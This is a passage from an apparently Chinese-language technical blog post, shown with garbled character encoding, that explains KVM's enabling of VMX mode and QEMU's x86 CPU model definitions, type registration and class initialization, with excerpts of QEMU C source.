type);//åˆå§‹åŒ–ç±»å‹ä¸ºkvm_archçš„archæˆå‘˜</code></li><li>æ¥ä¸‹æ¥kvm_create_vmè°ƒç”¨hardware_enable_allæ¥æœ€ç»ˆå¼€å¯VMXæ¨¡å¼ï¼Œhardware_enable_allä¼š<strong>åœ¨åˆ›å»ºç¬¬ä¸€ä¸ªè™šæ‹Ÿæœºçš„æ—¶å€™</strong>å¯¹æ¯ä¸ªCPUè°ƒç”¨hardware_enable_nolockï¼Œåè€…ä¼šè°ƒç”¨kvm_arch_hardware_enableå‡½æ•°ã€‚<ul><li>r = hardware_enable_all();</li><li>on_each_cpu(hardware_enable_nolock, NULL, 1);</li><li>hardware_enable_nolockè°ƒç”¨kvm_arch_hardware_enableå‡½æ•°</li><li>kvm_arch_hardware_enableä¸»è¦<strong>è°ƒç”¨Intel VMXå®ç°çš„hardware_enableå›è°ƒå‡½æ•°</strong>ï¼Œè¯¥å‡½æ•°çš„ä¸»è¦ä½œç”¨å°±æ˜¯<strong>è®¾ç½®CR4çš„VMXEä½å¹¶ä¸”è°ƒç”¨VMXONæŒ‡ä»¤å¼€å¯VMX</strong></li></ul></li></ul><h2 id="4-4-QEMU-CPUçš„åˆ›å»º"><a href="#4-4-QEMU-CPUçš„åˆ›å»º" class="headerlink" title="4.4 QEMU CPUçš„åˆ›å»º"></a>4.4 QEMU CPUçš„åˆ›å»º</h2><h3 id="4-4-1-CPUæ¨¡å‹å®šä¹‰"><a href="#4-4-1-CPUæ¨¡å‹å®šä¹‰" class="headerlink" title="4.4.1 CPUæ¨¡å‹å®šä¹‰"></a>4.4.1 CPUæ¨¡å‹å®šä¹‰</h3><p>QEMUï¼ˆQuick Emulatorï¼‰çš„CPUæ¨¡å‹ç»§æ‰¿ç»“æ„</p><ul><li>QEMUæ˜¯ä¸€ä¸ªèƒ½å¤Ÿæ¨¡æ‹Ÿå¤šç§ç¡¬ä»¶æ¶æ„çš„å·¥å…·ï¼Œå®ƒå¯ä»¥åœ¨å®¿ä¸»æœºä¸Šæ¨¡æ‹Ÿè¿è¡Œä¸åŒæ¶æ„çš„CPU</li><li>ä¸ºäº†æ”¯æŒä¸åŒçš„CPUæ¨¡å‹å’Œæ¶æ„ï¼Œéœ€è¦å»ºç«‹ä¸€ç§ç»§æ‰¿ç»“æ„æ¥è¡¨ç¤ºè¿™äº›CPUå¯¹è±¡</li><li>TYPE_X86_CPUï¼Œå®ƒè¡¨ç¤ºx86æ¶æ„ä¸‹çš„é€šç”¨CPUåŠŸèƒ½ã€‚åœ¨è¿™ä¸ªç±»å‹çš„åŸºç¡€ä¸Šï¼Œæ ¹æ®å…·ä½“çš„ç‰©ç†CPUæˆ–è™šæ‹ŸCPUæ¨¡å‹ï¼Œåˆ›å»ºäº†ä¸åŒçš„CPUç±»å‹ï¼Œä¾‹å¦‚â€pentiumâ€ã€â€Haswellâ€ç­‰ã€‚è¿™äº›å…·ä½“çš„CPUç±»å‹ä¼šåœ¨åŸºæœ¬çš„TYPE_X86_CPUç±»å‹çš„åŸºç¡€ä¸Šæ·»åŠ ç‰¹å®šçš„åŠŸèƒ½å’Œå±æ€§ï¼Œä»¥æ¨¡æ‹Ÿå„ç§ä¸åŒçš„CPUè¡Œä¸º</li><li>å­˜åœ¨ä¸€ä¸ªåä¸ºâ€qemu-x86_64-cpuâ€çš„è™šæ‹ŸCPUæ¨¡å‹ï¼Œå®ƒæ˜¯é»˜è®¤æƒ…å†µä¸‹åœ¨x86_64æ¶æ„ä¸‹ä½¿ç”¨çš„CPUæ¨¡å‹</li></ul><p>QEMUæ”¯æŒçš„x86 CPUéƒ½å®šä¹‰åœ¨ä¸€ä¸ªbuiltin_x86_defsæ•°ç»„ä¸­ï¼Œè¯¥æ•°ç»„çš„ç±»å‹ä¸ºX86CPUDefinitionï¼Œå®šä¹‰å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">X86CPUDefinition</span> &#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>    <span class="hljs-keyword">uint32_t</span> level;<br>    <span class="hljs-keyword">uint32_t</span> xlevel;<br>    <span class="hljs-comment">/* vendor is zero-terminated, 12 character ASCII string */</span><br>    <span class="hljs-keyword">char</span> vendor[CPUID_VENDOR_SZ + <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">int</span> family;<br>    <span class="hljs-keyword">int</span> model;<br>    <span class="hljs-keyword">int</span> stepping;<br>    FeatureWordArray features;<br>    <span class="hljs-keyword">char</span> model_id[<span class="hljs-number">48</span>];<br>&#125;;<br><br></code></pre></td></tr></table></figure><ol><li><code>const char *name;</code>ï¼šè¿™æ˜¯ä¸€ä¸ªæŒ‡å‘è¡¨ç¤ºCPUåç§°çš„å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚å®ƒç”¨äºæ ‡è¯†ç‰¹å®šçš„CPUæ¨¡å‹ï¼Œä¾‹å¦‚ â€œpentiumâ€ã€â€Haswellâ€ ç­‰ã€‚</li><li><code>uint32_t level;</code>ï¼šè¿™ä¸ªå­—æ®µè¡¨ç¤ºCPUIDæŒ‡ä»¤æ”¯æŒçš„æœ€å¤§åŠŸèƒ½å·ã€‚CPUIDæ˜¯ä¸€ä¸ªæŒ‡ä»¤ï¼Œç”¨äºæŸ¥è¯¢å¤„ç†å™¨çš„ç‰¹æ€§å’ŒåŠŸèƒ½ã€‚</li><li><code>uint32_t xlevel;</code>ï¼šè¿™ä¸ªå­—æ®µè¡¨ç¤ºCPUIDæ‰©å±•åŠŸèƒ½æ”¯æŒçš„æœ€å¤§åŠŸèƒ½å·ã€‚xlevelå¯¹åº”äºCPUIDä¸­çš„æ‰©å±•åŠŸèƒ½ã€‚</li><li><code>char vendor[CPUID_VENDOR_SZ + 1];</code>ï¼šè¿™æ˜¯ä¸€ä¸ªåŒ…å«CPUåˆ¶é€ å•†ä¿¡æ¯çš„å­—ç¬¦æ•°ç»„ã€‚å®ƒæ˜¯ä¸€ä¸ª12å­—èŠ‚çš„ASCIIå­—ç¬¦ä¸²ï¼Œä»¥NULLç»“å°¾ï¼Œç”¨äºæ ‡è¯†CPUçš„åˆ¶é€ å•†ã€‚</li><li><code>int family;</code>ï¼šè¿™ä¸ªå­—æ®µè¡¨ç¤ºCPUå®¶æ—ï¼ˆfamilyï¼‰çš„æ ‡è¯†ã€‚å®¶æ—åœ¨x86ä½“ç³»ç»“æ„ä¸­æ˜¯ä¸€ä¸ªè¾ƒå¤§çš„åˆ†ç±»ï¼Œç”¨äºæ ‡è¯†CPUåœ¨æŸä¸ªç³»åˆ—ä¸­çš„å½’å±ã€‚</li><li><code>int model;</code>ï¼šè¿™ä¸ªå­—æ®µè¡¨ç¤ºCPUå‹å·ï¼ˆmodelï¼‰ã€‚å‹å·ç”¨äºæ›´ç»†è‡´åœ°æ ‡è¯†CPUåœ¨ç‰¹å®šå®¶æ—ä¸­çš„å…·ä½“å‹å·ã€‚</li><li><code>int stepping;</code>ï¼šè¿™ä¸ªå­—æ®µè¡¨ç¤ºCPUçš„æ­¥è¿›ä¿¡æ¯ï¼Œç”¨äºè¿›ä¸€æ­¥åŒºåˆ†åŒä¸€å‹å·ä¸­çš„ä¸åŒç‰ˆæœ¬ã€‚</li><li><code>FeatureWordArray features;</code>ï¼šè¿™æ˜¯ä¸€ä¸ªè®°å½•CPUç‰¹æ€§çš„æ•°ç»„ã€‚å®ƒå¯èƒ½æ˜¯ä¸€ä¸ªä½æ•°ç»„ï¼Œæ¯ä¸ªä½å¯¹åº”ä¸€ä¸ªç‰¹å®šçš„CPUç‰¹æ€§ï¼Œç”¨äºæè¿°CPUçš„åŠŸèƒ½å’Œæ”¯æŒçš„æ‰©å±•ã€‚</li><li><code>char model_id[48];</code>ï¼šè¿™ä¸ªå­—æ®µåŒ…å«äº†CPUçš„å…¨åæˆ–æ¨¡å‹æ ‡è¯†ç¬¦ã€‚å®ƒæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨äºæä¾›æ›´è¯¦ç»†çš„CPUå‹å·ä¿¡æ¯ã€‚</li></ol><p>builtin_x86_defsæ˜¯ä¸€ä¸ªéå¸¸å¤§çš„æ•°ç»„ï¼Œæ¯ä¸€é¡¹è¡¨ç¤ºä¸€ç§æ¨¡æ‹Ÿçš„CPUæ¨¡å‹ã€‚QEMUæ—¢æ¨¡æ‹Ÿäº†ä¸€äº›å®é™…çš„CPUï¼Œæ¯”å¦‚pentiumå’ŒSandyBridgeï¼Œä¹Ÿæ¨¡æ‹Ÿäº†ä¸€äº›è™šæ‹Ÿæœºçš„CPUç±»å‹ï¼Œæ¯”å¦‚qemu64å’Œkvm64ç­‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> X86CPUDefinition builtin_x86_defs[] = &#123;<br>    &#123;<br>        .name = <span class="hljs-string">&quot;qemu64&quot;</span>,<br>        .level = <span class="hljs-number">0xd</span>,<br>        .vendor = CPUID_VENDOR_AMD,<br>        .family = <span class="hljs-number">6</span>,<br>        .model = <span class="hljs-number">6</span>,<br>        .stepping = <span class="hljs-number">3</span>,<br>        .features[FEAT_1_EDX] =<br>            PPRO_FEATURES |<br>            CPUID_MTRR | CPUID_CLFLUSH | CPUID_MCA |<br>            CPUID_PSE36,<br>        .features[FEAT_1_ECX] =<br>            CPUID_EXT_SSE3 | CPUID_EXT_CX16,<br>        .features[FEAT_8000_0001_EDX] =<br>            CPUID_EXT2_LM | CPUID_EXT2_SYSCALL | CPUID_EXT2_NX,<br>        .features[FEAT_8000_0001_ECX] =<br>            CPUID_EXT3_LAHF_LM | CPUID_EXT3_SVM,<br>        .xlevel = <span class="hljs-number">0x8000000A</span>,<br>        .model_id = <span class="hljs-string">&quot;QEMU Virtual CPU version &quot;</span> QEMU_HW_VERSION,<br>    &#125;,<br><br>....<br><br><br></code></pre></td></tr></table></figure><p>x86_cpu_register_types åœ¨ QEMU ä¸­æ³¨å†Œ x86 CPU ç±»å‹å’Œæ¨¡å‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * TypeInfo:</span><br><span class="hljs-comment"> * @name: The name of the type.</span><br><span class="hljs-comment"> * @parent: The name of the parent type.</span><br><span class="hljs-comment"> * @instance_size: The size of the object (derivative of #Object).  If</span><br><span class="hljs-comment"> *   @instance_size is 0, then the size of the object will be the size of the</span><br><span class="hljs-comment"> *   parent object.</span><br><span class="hljs-comment"> * @instance_init: This function is called to initialize an object.  The parent</span><br><span class="hljs-comment"> *   class will have already been initialized so the type is only responsible</span><br><span class="hljs-comment"> *   for initializing its own members.</span><br><span class="hljs-comment"> * @instance_post_init: This function is called to finish initialization of</span><br><span class="hljs-comment"> *   an object, after all @instance_init functions were called.</span><br><span class="hljs-comment"> * @instance_finalize: This function is called during object destruction.  This</span><br><span class="hljs-comment"> *   is called before the parent @instance_finalize function has been called.</span><br><span class="hljs-comment"> *   An object should only free the members that are unique to its type in this</span><br><span class="hljs-comment"> *   function.</span><br><span class="hljs-comment"> * @abstract: If this field is true, then the class is considered abstract and</span><br><span class="hljs-comment"> *   cannot be directly instantiated.</span><br><span class="hljs-comment"> * @class_size: The size of the class object (derivative of #ObjectClass)</span><br><span class="hljs-comment"> *   for this object.  If @class_size is 0, then the size of the class will be</span><br><span class="hljs-comment"> *   assumed to be the size of the parent class.  This allows a type to avoid</span><br><span class="hljs-comment"> *   implementing an explicit class type if they are not adding additional</span><br><span class="hljs-comment"> *   virtual functions.</span><br><span class="hljs-comment"> * @class_init: This function is called after all parent class initialization</span><br><span class="hljs-comment"> *   has occurred to allow a class to set its default virtual method pointers.</span><br><span class="hljs-comment"> *   This is also the function to use to override virtual methods from a parent</span><br><span class="hljs-comment"> *   class.</span><br><span class="hljs-comment"> * @class_base_init: This function is called for all base classes after all</span><br><span class="hljs-comment"> *   parent class initialization has occurred, but before the class itself</span><br><span class="hljs-comment"> *   is initialized.  This is the function to use to undo the effects of</span><br><span class="hljs-comment"> *   memcpy from the parent class to the descendents.</span><br><span class="hljs-comment"> * @class_finalize: This function is called during class destruction and is</span><br><span class="hljs-comment"> *   meant to release and dynamic parameters allocated by @class_init.</span><br><span class="hljs-comment"> * @class_data: Data to pass to the @class_init, @class_base_init and</span><br><span class="hljs-comment"> *   @class_finalize functions.  This can be useful when building dynamic</span><br><span class="hljs-comment"> *   classes.</span><br><span class="hljs-comment"> * @interfaces: The list of interfaces associated with this type.  This</span><br><span class="hljs-comment"> *   should point to a static array that&#x27;s terminated with a zero filled</span><br><span class="hljs-comment"> *   element.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TypeInfo</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *parent;<br><br>    <span class="hljs-keyword">size_t</span> instance_size;<br>    <span class="hljs-keyword">void</span> (*instance_init)(Object *obj);<br>    <span class="hljs-keyword">void</span> (*instance_post_init)(Object *obj);<br>    <span class="hljs-keyword">void</span> (*instance_finalize)(Object *obj);<br><br>    <span class="hljs-keyword">bool</span> abstract;<br>    <span class="hljs-keyword">size_t</span> class_size;<br><br>    <span class="hljs-keyword">void</span> (*class_init)(ObjectClass *klass, <span class="hljs-keyword">void</span> *data);<br>    <span class="hljs-keyword">void</span> (*class_base_init)(ObjectClass *klass, <span class="hljs-keyword">void</span> *data);<br>    <span class="hljs-keyword">void</span> (*class_finalize)(ObjectClass *klass, <span class="hljs-keyword">void</span> *data);<br>    <span class="hljs-keyword">void</span> *class_data;<br><br>    InterfaceInfo *interfaces;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">x86_cpu_register_types</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    type_register_static(&amp;x86_cpu_type_info);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ARRAY_SIZE(builtin_x86_defs); i++) &#123;<br>        x86_register_cpudef_type(&amp;builtin_x86_defs[i]);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_KVM</span><br>    type_register_static(&amp;host_x86_cpu_type_info);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;<br><br><br></code></pre></td></tr></table></figure><ol><li><code>x86_cpu_type_info</code> å’Œ <code>host_x86_cpu_type_info</code>ï¼šè¿™äº›å˜é‡æ˜¯ç”¨äºå®šä¹‰ x86 CPU ç±»å‹çš„ TypeInfo ç»“æ„ã€‚<code>x86_cpu_type_info</code> æ˜¯ç”¨äº QEMU å†…éƒ¨çš„è™šæ‹Ÿ CPU ç±»å‹ï¼Œè€Œ <code>host_x86_cpu_type_info</code> æ˜¯ç”¨äºä¸å®¿ä¸»æœºä¸Šçš„ CPU ç‰¹æ€§ä¿æŒä¸€è‡´çš„å®¿ä¸» CPU ç±»å‹ã€‚</li><li><code>x86_register_cpudef_type</code>ï¼šè¿™æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ ¹æ®ç»™å®šçš„ <code>X86CPUDefinition</code> ç»“æ„æ„å»ºä¸€ä¸ª <code>TypeInfo</code> ç»“æ„ï¼Œå¹¶é€šè¿‡ <code>type_register</code> å‡½æ•°å°†è¿™ä¸ªç±»å‹æ³¨å†Œåˆ° QEMU ç±»å‹ç³»ç»Ÿä¸­ã€‚å®ƒä¸ºæ¯ä¸ªä¸åŒçš„ CPU æ¨¡å‹åˆ›å»ºä¸€ä¸ªç±»å‹ï¼Œå¹¶æä¾›å¿…è¦çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ CPU åç§°ã€ç‰¹æ€§ã€å®¶æ—ã€å‹å·ç­‰ã€‚</li><li><code>x86_cpu_register_types</code>ï¼šè¿™ä¸ªå‡½æ•°æ˜¯ç”¨äºæ³¨å†Œ x86 CPU ç±»å‹å’Œæ¨¡å‹çš„ä¸»è¦å‡½æ•°ã€‚å®ƒé¦–å…ˆæ³¨å†Œäº†è™šæ‹Ÿçš„ x86 CPU ç±»å‹ <code>x86_cpu_type_info</code>ï¼Œç„¶åé€šè¿‡éå† <code>builtin_x86_defs</code> æ•°ç»„ä¸­çš„ CPU æ¨¡å‹å®šä¹‰ï¼Œä¸ºæ¯ä¸ªæ¨¡å‹è°ƒç”¨ <code>x86_register_cpudef_type</code> å‡½æ•°ï¼Œå°†å…¶æ³¨å†Œä¸º QEMU ç±»å‹ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¹Ÿæ ¹æ®éœ€è¦æ³¨å†Œäº†å®¿ä¸»æœºçš„ CPU ç±»å‹ <code>host_x86_cpu_type_info</code>ã€‚</li></ol><p><img src="https://img.gls.show/img/20230821173738.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">X86CPU</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    CPUState parent_obj;<br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br><br>    CPUX86State env;<br><br>.....<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªX86CPUè¡¨ç¤ºä¸€ä¸ªx86è™šæ‹ŸCPU</p><ol><li>CPUStateåŒ…å«æ‰€æœ‰CPUç±»å‹éƒ½ä¼šæœ‰çš„æ•°æ®ï¼Œå¦‚CPUçš„æ ¸æ•°ã€çº¿ç¨‹æ•°ä»¥åŠå¯¹åº”çš„çº¿ç¨‹ï¼Œç”±äºå†å²åŸå› ï¼Œä¹Ÿä¼šæœ‰è¯¸å¦‚TCGå’ŒKVMç­‰æ¨¡æ‹Ÿå™¨ç›¸å…³çš„æ•°æ®ï¼Œå¦‚kvm_fdã€kvm_stateã€kvm_runç­‰KVMç›¸å…³çš„æ•°æ®ã€‚CPUStateä¸­æœ‰ä¸€ä¸ªenv_ptræŒ‡é’ˆï¼ŒæŒ‡å‘çš„æ˜¯å…¶CPUæ¶æ„çš„CPUçŠ¶æ€ä¿¡æ¯ã€‚</li><li><strong>env_ptrï¼š</strong> è¿™æ˜¯ CPUState ä¸­çš„ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ç‰¹å®š CPU æ¶æ„çš„ CPU çŠ¶æ€ä¿¡æ¯ã€‚å®ƒçš„ä½œç”¨æ˜¯ä¸ºäº†æ–¹ä¾¿åœ°ä»é€šç”¨çš„ CPUState ç»“æ„ä¸­è·å–ç‰¹å®šæ¶æ„çš„å…·ä½“ CPU æ•°æ®ï¼Œä½¿å¾—ä¸åŒæ¶æ„çš„ CPU å¯ä»¥åœ¨åŒä¸€ä¸ªé€šç”¨ç»“æ„ä¸­å…±å­˜ã€‚ä¾‹å¦‚ï¼Œå¯¹äº x86 æ¶æ„çš„ CPUï¼Œenv_ptr æŒ‡å‘çš„å°±æ˜¯ CPUX86State ç»“æ„ã€‚</li><li><strong>X86CPUStateï¼ˆenvï¼‰ï¼š</strong> è¿™æ˜¯ X86 æ¶æ„ç‰¹å®šçš„ CPU æ•°æ®ç»“æ„ã€‚åœ¨ X86CPU ç»“æ„ä¸­ï¼Œä¼šåŒ…å«ä¸€ä¸ªæŒ‡å‘ X86CPUState çš„æŒ‡é’ˆï¼ˆenvï¼‰ï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘äº†åŒ…å«äº†é‡è¦çš„ x86 æ¶æ„ CPU æ•°æ®çš„ç»“æ„ã€‚CPUX86State ä¸­åŒ…å«äº†é€šç”¨å¯„å­˜å™¨ã€EIPã€EFLAGSã€æ®µå¯„å­˜å™¨ç­‰å¯„å­˜å™¨çš„å€¼ï¼Œè¿˜åŒ…å«äº† KVM ç›¸å…³çš„å¼‚å¸¸ã€ä¸­æ–­ä¿¡æ¯ä»¥åŠ CPUID çš„ä¿¡æ¯ã€‚åœ¨æ¨¡æ‹Ÿè¿‡ç¨‹ä¸­ï¼Œè¿™äº›æ•°æ®ç”¨äºæ¨¡æ‹Ÿ x86 æ¶æ„ CPU çš„çŠ¶æ€å’Œè¡Œä¸ºã€‚</li></ol><h3 id="4-4-2-CPUå¯¹è±¡çš„åˆå§‹åŒ–"><a href="#4-4-2-CPUå¯¹è±¡çš„åˆå§‹åŒ–" class="headerlink" title="4.4.2 CPUå¯¹è±¡çš„åˆå§‹åŒ–"></a>4.4.2 CPUå¯¹è±¡çš„åˆå§‹åŒ–</h3><p>CPUç±»å‹çš„åˆå§‹åŒ–åŸºæœ¬éƒ½æ˜¯è®¾ç½®ä¸€ç³»åˆ—çš„å›è°ƒå‡½æ•°ï¼Œä½†ç±»å‹TYPE_X86_CPUçš„åˆå§‹åŒ–å‡½æ•°x86_cpu_common_class_initè¾ƒä¸ºç‰¹æ®Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">x86_cpu_common_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-keyword">void</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    X86CPUClass *xcc = X86_CPU_CLASS(oc);<br>    CPUClass *cc = CPU_CLASS(oc);<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br><br>    xcc-&gt;parent_realize = dc-&gt;realize;<br>    xcc-&gt;parent_unrealize = dc-&gt;unrealize;<br>    dc-&gt;realize = x86_cpu_realizefn;<br>    dc-&gt;unrealize = x86_cpu_unrealizefn;<br>    .....<br></code></pre></td></tr></table></figure><ol><li><code>x86_cpu_common_class_init</code> å‡½æ•°ï¼šè¿™æ˜¯ç”¨äºåˆå§‹åŒ– x86 CPU ç±»çš„å…±äº«å±æ€§å’Œæ–¹æ³•çš„å‡½æ•°ã€‚å®ƒé€šè¿‡å‚æ•° <code>oc</code>ï¼ˆObjectClass ç»“æ„æŒ‡é’ˆï¼‰å’Œ <code>data</code>æ¥è¿›è¡Œåˆå§‹åŒ–ã€‚åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå®ƒé¦–å…ˆè·å–äº† x86 CPU ç±»å’Œçˆ¶ç±»ï¼ˆCPU ç±»å’Œè®¾å¤‡ç±»ï¼‰çš„æŒ‡é’ˆã€‚</li><li><code>X86_CPU_CLASS(oc)</code>ï¼šè¿™æ˜¯ä¸€ä¸ªå®ï¼Œç”¨äºå°† <code>oc</code> è½¬æ¢ä¸º <code>X86CPUClass</code> ç±»å‹çš„æŒ‡é’ˆï¼Œä»¥ä¾¿å¯ä»¥è®¿é—® x86 CPU ç±»çš„å±æ€§å’Œæ–¹æ³•ã€‚</li><li><code>CPU_CLASS(oc)</code>ï¼šè¿™æ˜¯ä¸€ä¸ªå®ï¼Œç”¨äºå°† <code>oc</code> è½¬æ¢ä¸º <code>CPUClass</code> ç±»å‹çš„æŒ‡é’ˆï¼Œä»¥ä¾¿å¯ä»¥è®¿é—®é€šç”¨ CPU ç±»çš„å±æ€§å’Œæ–¹æ³•ã€‚</li><li><code>DEVICE_CLASS(oc)</code>ï¼šè¿™æ˜¯ä¸€ä¸ªå®ï¼Œç”¨äºå°† <code>oc</code> è½¬æ¢ä¸º <code>DeviceClass</code> ç±»å‹çš„æŒ‡é’ˆï¼Œä»¥ä¾¿å¯ä»¥è®¿é—®è®¾å¤‡ç±»çš„å±æ€§å’Œæ–¹æ³•ã€‚</li><li><code>xcc-&gt;parent_realize = dc-&gt;realize;</code> å’Œ <code>xcc-&gt;parent_unrealize = dc-&gt;unrealize;</code>ï¼š<ol><li>è¿™ä¸¤è¡Œä»£ç å°†è®¾å¤‡ç±»çš„ <code>realize</code> å’Œ <code>unrealize</code> å‡½æ•°èµ‹å€¼ç»™ x86 CPU ç±»ä¸­çš„ <code>parent_realize</code> å’Œ <code>parent_unrealize</code> æˆå‘˜ã€‚</li><li>è¿™æ˜¯ä¸ºäº†åœ¨ x86 CPU ç±»çš„å…·ç°åŒ–å’Œé”€æ¯è¿‡ç¨‹ä¸­ï¼Œèƒ½å¤Ÿåœ¨æ‰§è¡Œç‰¹å®šçš„ <code>x86_cpu_realizefn</code> å’Œ <code>x86_cpu_unrealizefn</code> å‡½æ•°ä¹‹å‰ï¼Œæ‰§è¡Œé€šç”¨çš„è®¾å¤‡ç±»çš„å…·ç°åŒ–å’Œé”€æ¯å‡½æ•°ã€‚</li></ol></li><li><code>dc-&gt;realize = x86_cpu_realizefn;</code> å’Œ <code>dc-&gt;unrealize = x86_cpu_unrealizefn;</code>ï¼š<ol><li>è¿™ä¸¤è¡Œä»£ç å°†è®¾å¤‡ç±»çš„ <code>realize</code> å’Œ <code>unrealize</code> X86CPU<br>å­å¯¹è±¡çš„ <code>x86_cpu_realizefn</code> å’Œ <code>x86_cpu_unrealizefn</code> å‡½æ•°ã€‚</li><li>è¿™æ˜¯ä¸ºäº†ç¡®ä¿åœ¨å…·ç°åŒ–å’Œé”€æ¯è¿‡ç¨‹ä¸­æ‰§è¡Œ x86 CPU ç±»çš„ç‰¹å®šå‡½æ•°ã€‚</li></ol></li></ol><blockquote><p>è¿™ä¸€å—å…³äºCPUç±»å‹åœ¨åˆå§‹åŒ–æ—¶è®¾ç½®çš„<strong>å…·ç°å‡½æ•°</strong>ï¼Œåé¢å†ä»”ç»†çœ‹çœ‹</p></blockquote><p>æ¥ä¸‹æ¥è¯¦ç»†åˆ†æCPUå¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹</p><p>æŒ‰ç…§ç»§æ‰¿å…³ç³»ï¼Œé¦–å…ˆè°ƒç”¨TYPE_CPUçš„å¯¹è±¡åˆå§‹åŒ–å‡½æ•°cpu_common_initfnã€‚è¿™ä¸ªå‡½æ•°æ˜¯åœ¨æ‰€æœ‰CPUç±»å‹ï¼ˆæ¯”å¦‚x86ã€ARMç­‰ï¼‰å…±äº«çš„TYPE_CPUçš„åˆå§‹åŒ–å‡½æ•°ã€‚å®ƒä¼šåœ¨æ¯ä¸ªCPUå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œæ— 